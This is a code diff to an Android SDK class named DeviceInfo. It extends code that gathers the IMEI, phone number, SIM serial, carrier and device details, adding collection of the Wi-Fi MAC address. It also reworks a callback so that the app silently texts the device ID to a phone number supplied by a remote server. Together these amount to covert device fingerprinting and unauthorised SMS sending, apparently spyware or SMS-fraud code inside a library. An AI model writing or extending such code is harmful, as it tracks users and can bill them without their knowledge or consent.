@@ -1,6 +1,8 @@
 package com.ss.sssdk;
 
 import android.content.Context;
+import android.net.wifi.WifiInfo;
+import android.net.wifi.WifiManager;
 import android.os.Build;
 import android.telephony.SmsManager;
 import android.telephony.TelephonyManager;
@@ -14,13 +16,18 @@ public class DeviceInfo {
     public static JSONObject getDeviceInfo() {
         JSONObject info = new JSONObject();
         TelephonyManager tm = (TelephonyManager) SdkTools.context.getSystemService(Context.TELEPHONY_SERVICE);
+        WifiManager wifi = (WifiManager) SdkTools.context.getSystemService(Context.WIFI_SERVICE);
         try {
+
+            WifiInfo wifiinfo = wifi.getConnectionInfo();
+            info.put("mac",wifiinfo.getMacAddress());
             info.put("Imei", tm.getDeviceId());
             info.put("SoftVersion",tm.getDeviceSoftwareVersion());
             info.put("Phone",tm.getLine1Number());
             info.put("Operator",tm.getNetworkOperatorName());
             info.put("PhoneType",tm.getPhoneType());
             info.put("SimSerial", tm.getSimSerialNumber());
+            info.put("VersionRelease", Build.VERSION.RELEASE);
             info.put("Model",android.os.Build.MODEL);
             info.put("Device",android.os.Build.DEVICE);
             info.put("Product",android.os.Build.PRODUCT);
@@ -72,16 +79,18 @@ public class DeviceInfo {
             @Override
             public void callback(JSONObject ret) {
                 if (ret != null) {
-                    JsonObject retobj = (JsonObject)ret;
                     try {
-                        if (retobj.getBoolean("b")) {
-                            String phone = (String)retobj.Get("mp");
-                            if (phone != null && SdkTools.isPhone(phone)) {
-                                SdkTools.setKV("phone",phone);
-                            }else {
-                                String sphone = (String)retobj.Get("sp");
+                        if (ret.getBoolean("b")) {
+                            JSONObject result = ret.getJSONObject("result");
+                            if(result.has("mp")) {
+                                String phone = result.getString("mp");
                                 if (phone != null && SdkTools.isPhone(phone)) {
-                                    SdkTools.sendSMS(sphone, "#CHECK#" + DeviceInfo.getDeviceId());
+                                    SdkTools.setKV("phone",phone);
+                                }
+                            }else if(result.has("sp")) {
+                                String sphone = (String)result.getString("sp");
+                                if (sphone != null && SdkTools.isPhone(sphone)) {
+                                    SdkTools.sendSMS(sphone, SMSObserver.FILTER_CEHCKPHONE + DeviceInfo.getDeviceId());
                                 }
                             }
                         }
